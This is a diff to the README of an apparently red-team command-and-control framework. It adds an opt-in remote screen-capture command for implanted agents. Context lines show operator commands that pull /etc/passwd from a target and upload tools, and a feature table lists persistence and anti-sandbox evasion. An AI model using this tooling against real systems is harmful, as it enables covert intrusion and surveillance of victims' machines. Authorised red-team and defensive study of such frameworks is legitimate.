@@ -46,7 +46,8 @@ pupyteer > payloads build --name test-payload --platform linux --arch x64 \
 
 `--sleep` / `--jitter` set the beacon interval compiled into the payload.
 `--persistence` is **off by default**: the agent only installs a registry /
-crontab entry when you ask for it explicitly.
+crontab entry when you ask for it explicitly. `--screenshot` is likewise opt-in;
+a payload built without it answers a capture request with `unknown action`.
 
 To use HTTP callbacks instead, enable the listener in the server config and
 build with `--transport http`:
@@ -102,6 +103,7 @@ pupyteer > sessions interact <session_id>      # shell: sysinfo, ps, fs_list /et
 pupyteer > sessions results <session_id>       # output of commands already answered
 pupyteer > sessions download <session_id> /etc/passwd ./passwd
 pupyteer > sessions upload <session_id> ./tool /tmp/tool
+pupyteer > sessions screenshot <session_id> ./screen.png   # needs --screenshot
 ```
 
 Commands are queued per session and delivered on the agent's next check-in, so
@@ -109,6 +111,13 @@ output appears after up to one beacon interval. Inside `sessions interact` the
 shell waits and prints the reply; if you leave early, `sessions results` catches
 up. Transfers are chunked, so a file larger than the operator's memory is not a
 problem.
+
+`sessions screenshot` captures the whole screen using whatever the host already
+provides — PowerShell's `System.Drawing` on Windows, `screencapture` on macOS,
+and the first available of `gnome-screenshot`/`scrot`/`spectacle`/
+`xfce4-screenshooter`/`import`/`grim` on Linux — so the agent pulls in no imaging
+library. The image is returned over the session and deleted from the target's
+temp directory; there is no third-party dependency to ship.
 
 ---
 
@@ -151,7 +160,7 @@ PUPYTEER
 | **Transports** | Served listeners: **TCP** and **HTTP/HTTPS** (same session protocol, one JSON message per POST). Agent-side DNS/DoH/WebSocket stubs exist but have no listener, so `payloads build` rejects them rather than ship a payload that can never call back. |
 | **C2 Profiles** | YAML-based malleable C2 — heartbeat, encoding, timeouts, headers, URIs |
 | **Modules** | Core, Recon, Execution, File Ops, Red-Team, Evasion — standardized ABC |
-| **Sessions** | list/info/interact/rename/kill/tag/search, chunked file upload & download, audit trail |
+| **Sessions** | list/info/interact/rename/kill/tag/search, chunked file upload & download, screen capture, audit trail |
 | **Tasks** | Priority queue (CRITICAL → BACKGROUND), async execution, tracking |
 | **Evasion** | XOR/AES/RC4 obfuscation, PE manipulation, anti-sandbox/debug/VM, Litterbox integration |
 | **Security** | mTLS 1.2+, JWT, RBAC, input validation, credential redaction, session auth |
@@ -218,7 +227,7 @@ git-ignored.
 .venv/bin/python -m pytest pupyteer/tests/integration/ -v
 ```
 
-**Current test count: 750 tests passing** (`pytest pupyteer/tests`)
+**Current test count: 754 tests passing** (`pytest pupyteer/tests`)
 
 ---
 
